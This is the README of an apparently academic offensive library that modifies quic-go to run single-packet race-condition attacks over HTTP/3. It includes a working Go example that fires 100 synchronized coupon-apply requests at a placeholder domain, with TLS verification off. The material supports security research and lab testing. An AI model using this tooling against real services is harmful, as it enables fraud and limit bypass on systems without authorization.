# H3SpaceX
H3SpaceX library is manipulated version of [quic-go](https://github.com/quic-go/quic-go) to 
enable the Single Packet Attack (Last Frame Synchronization) in HTTP/3 (QUIC). 
This library was part of an academic research with title of [QUIC-er Races: HTTP/3 won’t save you from TOCTOU vulnerabilities](https://link.springer.com/article/10.1007/s10207-026-01258-6).

## Library Usage (how to exploit last frame synchronization - also known as single packet attack on HTTP/3)
There are two methods for exploiting last frame synchronization:

- Function `SendRequestsWithLastFrameSynchronizationMethod`:
- This function is for requests `which have body`!
- Function parameters:
  - first param gets QUIC connection (type: quic.Connection)
  - second param gets an array of requests which need to be sent.
  - third param is for number of bytes which needs to be kept from end of the DATA frame. (at least & best 1)
  - fourth param is for number of milliseconds which library waits before sending last DATA frames
  - fifth param is for setting or unsetting Content-Length header. If false, the Content-Header will not be set, unless you set it directly in requests headers
- Function return:
  - a map of requests with value of their response
```go
func SendRequestsWithLastFrameSynchronizationMethod(quicConn quic.Connection,
	allRequests []*http.Request,
	lastByteNum int,
	sleepMillisecondsBeforeSendingLastByte int,
	setContentLength bool,
) map[*http.Request]*http.Response
```

- Function `SendRequestsWithoutBodyWithinASinglePacket`:
- This function is for requests `which do *not* have body`!
- Function parameters:
    - first param gets QUIC connection (type: quic.Connection)
    - second param gets an array of requests which need to be sent.
- Function return:
    - a map of requests with value of their response
```go
func SendRequestsWithoutBodyWithinASinglePacket(quicConn quic.Connection,
	allRequests []*http.Request,
) map[*http.Request]*http.Response
```

### Installation

    go mod init PROJECT_NAME
    go get github.com/nxenon/h3spacex
    Write the code (exploit) then run following command (to include all dependencies in go.mod):
    go mod tidy


### Steps to Call Functions
- Import libraries
- Create TLS config 
- Create QUIC config
- create a list of requests (use http3.GetRequestObject function) and append them into requests list
- Establish QUIC connection
- Call http3.SendRequestsWithLastFrameSynchronizationMethod `or` http3.SendGetNoBodyRequestsWithSinglePacketAttackMethod methods based on your needs
```go
package main

import (
	"crypto/tls"
	"fmt"
	"strings"

	"context"
	"github.com/nxenon/h3spacex"
	"github.com/nxenon/h3spacex/http3"
	"io"
	"net/http"
	"os"
	"time"
)

func main() {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{http3.NextProtoH3},
	}

	quicConf := &quic.Config{
		MaxIdleTimeout:  10 * time.Second,
		KeepAlivePeriod: 10 * time.Millisecond,
	}

	var allRequests []*http.Request

	headers := map[string]string{
		"Cookie":       "x=y",
		"Content-Type": "application/json", // sample
	}

	reqBody := "{\"couponValue\":\"Coupon1\"}"

	for i := 0; i < 100; i++ { // 100 requests
		req, err2 := http3.GetRequestObject("https://DOMAIN.COM/api/cart/apply_coupon", "POST", headers, []byte(reqBody))
		if err2 != nil {
			fmt.Println("Error creating request: ", err2)
			continue
		}
		allRequests = append(allRequests, &req)
	}

	dialAddress := "IP:PORT" // destination IP address and UDP port
	ctx := context.Background()
	quicConn, err := quic.DialAddr(ctx, dialAddress, tlsConf, quicConf)
	if err != nil {
		fmt.Printf("Error Connecting to %s. Erorr: %s", dialAddress, err)
		os.Exit(1)
	}

	allResponses := http3.SendRequestsWithLastFrameSynchronizationMethod(quicConn, allRequests, 1, 150, true)

	for req, res := range allResponses {
		fmt.Printf("for request to %s\n", req.URL)
		fmt.Println("+---Headers---+")
		fmt.Printf("Status Code: %d\n", res.StatusCode)
		for key, value := range res.Header {
			fmt.Printf("%s: %s\n", key, value[0])
		}
		fmt.Println("+---Body---+")
		body, err3 := io.ReadAll(res.Body)
		if err3 != nil {
			fmt.Println("Error reading response body:", err3)
			continue
		}
		fmt.Println(string(body))

	}
}

```


## Exploits Sample
See [Exploit](./exploit) Directory. It contains:
- [Last Frame Synchronization for Requests with a Body](exploit/README.md#last-frame-synchronization-for-requests-with-a-body)
- [Last Frame Synchronization for Requests without Body (GET requests within a single packet)](exploit/README.md#last-frame-synchronization-for-requests-without-body-get-requests-within-a-single-packet)
- [Last Frame Synchronization for Requests without Body (GET requests with FAKE DATA Frames)](exploit/README.md#last-frame-synchronization-for-requests-without-body-get-requests-with-fake-data-frames)

## Talk / Presentation
We presented this research at a PortSwigger Discord event. Watch the recording here: [QUIC-er Races: HTTP/3 won’t save you from TOCTOU vulnerabilities](https://youtu.be/BaEQKgW-8iY)

## Lab (HTTP/2/3 Web Application)
For testing exploits see [Rc-H3-WebApp](https://github.com/nxenon/rc-h3-webapp/) repo.

## References
- [quic-go](https://github.com/quic-go/quic-go) as base library
